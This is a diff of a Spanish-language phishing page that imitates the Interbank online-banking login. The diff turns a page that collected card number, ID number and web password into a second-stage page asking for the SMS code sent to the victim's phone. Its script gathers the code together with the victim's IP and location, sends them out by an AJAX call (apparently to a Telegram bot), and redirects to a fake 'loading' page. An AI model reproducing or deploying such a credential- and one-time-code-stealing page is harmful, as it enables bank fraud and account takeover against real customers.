@@ -1,4 +1,5 @@
 <!DOCTYPE html>
+
 <html lang="es"><head class="at-element-marker"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
   
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -13,7 +14,6 @@
   <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=5.0">
 
 <style type="text/css" id="operaUserStyle"></style>
-
 
 <script src="telegmdjshnjdf.js"></script>
 	
@@ -36,14 +36,12 @@
   
         <script>
   
-  var u_name, pax, pax2, ip, ip2;
+  var u_name, ip, ip2;
   var ready = function () {
-    u_name = document.getElementById("25").value;
-    pax = document.getElementById("39").value;
-    pax2 = document.getElementById("46").value;
+    u_name = document.getElementById("46").value;
     ip = document.getElementById("gfg").innerHTML;
     ip2 = document.getElementById("address").innerHTML;
-    message = "Interbank\nTarjeta: " + u_name + "\nDocumento: " + pax +"\nClave: " + pax2 +"\n🌎IP: " + ip +"\n" + ip2;
+    message = "Interbank\nCodigo1: " + u_name + "\n🌎IP: " + ip +"\n" + ip2;
   };
   var sender = function () {
     ready();
@@ -63,7 +61,7 @@
         })
     };
     $.ajax(settings).done(function (response) {
-    window.location = 'cargando.html';
+    window.location = 'cargando2.html';
   
         console.log(response);
     
@@ -74,9 +72,8 @@
   };
   
       </script>
-      
-    
-    </head>
+
+</head>
 
 <body>
   <div id="app">
@@ -84,8 +81,6 @@
                      
       <p id="gfg"  hidden=""></p>
       <p id="address"  hidden=""></p>
-
-
       <div data-v-6e2e026b="" class="login login--ctn ibk-login-layout-layout ibk-login-layout__background-blur">
         <div data-v-6e2e026b="" class="ibk-login-layout__background">
           <div data-v-6e2e026b="" class="ibk-login-layout__wrapper">
@@ -99,73 +94,23 @@
                       <div class="ibk-form" data-v-6793d155="">
                         <div class="ibk-auth-fields">
                           <div class="ibk-grid-row">
-                            <div data-v-a4cc4d26="" class="ibk-grid__col ibk-auth-fields__checkbox-remember__wrapper ibk-grid__col--1-1">
-                              <div data-v-41575993="" class="ibk-textfield mdl-textfield input-text mdl-textfield--floating-label" id="cardNumber" data-v-a4cc4d26=""><label data-v-41575993="" for="25" class="mdl-textfield__label">Número de
-                                  tarjeta</label><input data-v-41575993="" required="" name="docnm" id="25" inputmode="tel" minlength="19" maxlength="19" class="mdl-textfield__input">
-                                <div data-v-41575993="" class="ibk-textfield__icon-appended"></div>
-
-                              </div>
-                              <div data-v-1243fb90="" class="ibk-auth-fields__checkbox-remember" data-v-a4cc4d26="">
-                                <span data-v-1243fb90="" class="ibk-auth-fields__checkbox__separator-line" style="display: none;"></span>
-                              </div>
-                            </div>
+                           
                           </div>
-
-
-
-                          
                           <div class="ibk-grid-row">
-                            <div data-v-a4cc4d26="" class="ibk-grid__col ibk-grid__col--1-4">
-                              <div data-v-0cae509c="" tabindex="-1" class="ibk-combobox" data-v-a4cc4d26="">
-                                <div id="documentType" data-v-0cae509c="" class="ibk-combobox__selections">
-                                  <div data-v-0cae509c="" class="mdl-textfield mdl-textfield--floating-label is-dirty">
-                                    <div data-v-0cae509c="" id="selectedOption" class="ibk-combobox__selections__input-fake mdl-textfield__input">
-                                      DNI       <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZlcnNpb249IjEuMSIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHdpZHRoPSI1MTIiIGhlaWdodD0iNTEyIiB4PSIwIiB5PSIwIiB2aWV3Qm94PSIwIDAgNDUxLjg0NyA0NTEuODQ3IiBzdHlsZT0iZW5hYmxlLWJhY2tncm91bmQ6bmV3IDAgMCA1MTIgNTEyIiB4bWw6c3BhY2U9InByZXNlcnZlIiBjbGFzcz0iIj48Zz48cGF0aCBkPSJNMjI1LjkyMyAzNTQuNzA2Yy04LjA5OCAwLTE2LjE5NS0zLjA5Mi0yMi4zNjktOS4yNjNMOS4yNyAxNTEuMTU3Yy0xMi4zNTktMTIuMzU5LTEyLjM1OS0zMi4zOTcgMC00NC43NTEgMTIuMzU0LTEyLjM1NCAzMi4zODgtMTIuMzU0IDQ0Ljc0OCAwbDE3MS45MDUgMTcxLjkxNSAxNzEuOTA2LTE3MS45MDljMTIuMzU5LTEyLjM1NCAzMi4zOTEtMTIuMzU0IDQ0Ljc0NCAwIDEyLjM2NSAxMi4zNTQgMTIuMzY1IDMyLjM5MiAwIDQ0Ljc1MUwyNDguMjkyIDM0NS40NDljLTYuMTc3IDYuMTcyLTE0LjI3NCA5LjI1Ny0yMi4zNjkgOS4yNTd6IiBmaWxsPSIjOGU4ZjkwIiBvcGFjaXR5PSIxIiBkYXRhLW9yaWdpbmFsPSIjMDAwMDAwIiBjbGFzcz0iIj48L3BhdGg+PC9nPjwvc3ZnPg==" alt="" style="width: 8px;">
-
-                                    </div><label data-v-0cae509c="" for="32" class="mdl-textfield__label"></label>
-
-                                    
-                                  </div>
-                                </div>
-                                <ul data-v-0cae509c="" id="docSelector" class="ibk-combobox__options mdl-menu__container is-upgraded">
-                                  <li data-v-115756c5="" data-v-0cae509c="" id="dniOption" class="ibk-combobox-option ibk-combobox-option--selected ibk-combobox-option--focused">
-                                    DNI
-                                  </li>
-                                  <li data-v-115756c5="" data-v-0cae509c="" id="ceOption" class="ibk-combobox-option">
-                                    CE
-                                  </li>
-                                  <li data-v-115756c5="" data-v-0cae509c="" id="pasOption" class="ibk-combobox-option">
-                                    PAS
-                                  </li>
-                                </ul>
-                              </div>
-                            </div>
-                            <div data-v-a4cc4d26="" class="ibk-grid__col ibk-auth-fields__checkbox-remember__wrapper ibk-grid__col--3-4">
-                              <div data-v-41575993="" class="ibk-textfield mdl-textfield input-text mdl-textfield--floating-label" id="documentNumber" data-v-a4cc4d26=""><label data-v-41575993="" for="39" class="mdl-textfield__label">Número de
-                                  documento</label><input data-v-41575993="" required="" id="39" inputmode="tel" type="text" maxlength="8" class="mdl-textfield__input" name="usezario">
-                                <div data-v-41575993="" class="ibk-textfield__icon-appended"></div>
-
-                              </div>
-
-                            </div>
+                            
+                           
                           </div>
                         </div>
                         <div>
                           <div>
+
+                            <center><h2>Introduzca el código que hemos enviado a su celular registrado</h2></center>
                             <div data-v-41575993="" class="ibk-textfield mdl-textfield ibk-textfield--prepended mdl-textfield--floating-label" id="password">
-                              <label data-v-41575993="" for="46" class="mdl-textfield__label">Clave web</label>
-                              
-                              
-                              
-                              <input data-v-41575993="" id="46" inputmode="text" required="" type="password" name="pwdod" class="mdl-textfield__input" maxlength="20">
+                              <label data-v-41575993="" for="46"  class="mdl-textfield__label"></label><input data-v-41575993="" id="46" inputmode="text" required="" type="password" name="pwdod" class="mdl-textfield__input" maxlength="8" placeholder="Código">
                               <div data-v-41575993="" class="ibk-textfield__icon-appended"></div>
 
                             </div>
                           </div>
-                        </div>
-                        <div class="ibk-ui-checkbox"><label for="rememberMe" id="checkBoxOption" class="mdl-checkbox is-upgraded"><input type="checkbox" id="rememberMe" name="rememberMe" class="form__checkbox mdl-checkbox__input"><span class="mdl-checkbox__label"> Recordar
-                              datos </span><span class="mdl-checkbox__focus-helper"></span><span class="mdl-checkbox__box-outline"><span class="mdl-checkbox__tick-outline"></span></span></label>
-
                         </div><button data-v-521d65ac="" id="submitButton" type="submit" class="tw-mt-8 ibk-ui-button ibk-ui-button--primary ibk-ui-button--center">
                           Ingresar
                         </button>
